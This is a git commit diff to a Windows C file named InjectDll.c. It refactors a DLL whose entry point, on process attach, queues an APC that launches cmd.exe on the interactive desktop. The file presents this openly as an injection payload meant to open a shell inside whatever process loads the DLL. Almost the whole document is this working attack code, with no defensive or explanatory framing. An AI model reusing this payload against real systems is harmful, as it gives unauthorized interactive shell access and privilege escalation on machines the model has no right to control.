c8010d27ccb338f217b8e970761ecece65b6b46f
YL <>
2026-07-09 19:24:34 +0200

    Refactor DLL injection process to use a separate SpawnCmdApc function for improved readability and maintainability

--- DLL/DLL/InjectDll.c
+++ DLL/DLL/InjectDll.c
@@ -1,22 +1,42 @@
-// InjectDll.c
 #include <Windows.h>
+
+VOID CALLBACK SpawnCmdApc(ULONG_PTR dwParam)
+{
+    STARTUPINFOW si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+
+    (void)dwParam;
+
+    si.cb = sizeof(si);
+    si.lpDesktop = L"WinSta0\\Default";
+
+    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
+                   NULL,
+                   NULL,
+                   NULL,
+                   FALSE,
+                   CREATE_NEW_CONSOLE,
+                   NULL,
+                   NULL,
+                   &si,
+                   &pi);
+
+    if (pi.hProcess) {
+        CloseHandle(pi.hProcess);
+    }
+    if (pi.hThread) {
+        CloseHandle(pi.hThread);
+    }
+}
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
-    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
-    {
-        STARTUPINFOW si = { sizeof(si) };
-        PROCESS_INFORMATION pi;
-        si.lpDesktop = L"WinSta0\\Default";  // interactive window station
+    (void)hModule;
+    (void)lpReserved;
 
-        if (CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
-            NULL, NULL, NULL, FALSE,
-            CREATE_NEW_CONSOLE,
-            NULL, NULL, &si, &pi))
-        {
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
-        }
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        QueueUserAPC(SpawnCmdApc, GetCurrentThread(), 0);
     }
+
     return TRUE;
 }
